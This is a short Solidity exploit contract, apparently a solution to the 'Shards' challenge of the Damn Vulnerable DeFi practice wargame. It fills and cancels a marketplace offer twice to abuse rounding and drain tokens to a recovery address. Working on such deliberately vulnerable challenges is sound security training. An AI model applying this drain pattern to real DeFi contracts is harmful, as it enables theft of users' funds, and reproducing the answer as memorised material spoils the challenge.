pragma solidity =0.8.25;

import {
    ShardsNFTMarketplace,
    DamnValuableToken
} from "../../src/shards/ShardsNFTMarketplace.sol";

contract ExploitContract {
    constructor(ShardsNFTMarketplace marketplace, DamnValuableToken token, address recovery) payable {
        // Received 9.975e-6 DVT (9975000000000)
        uint64 offerId = 1;
        uint256 purchaseIndex1 = marketplace.fill(offerId, 133);
        marketplace.cancel(offerId, purchaseIndex1);

        token.approve(address(marketplace), 750000000000000000000);
        uint256 purchaseIndex2 = marketplace.fill(offerId, 1e10 - 133);
        marketplace.cancel(offerId, purchaseIndex2);

        token.transfer(recovery, token.balanceOf(address(this)));
    }
}
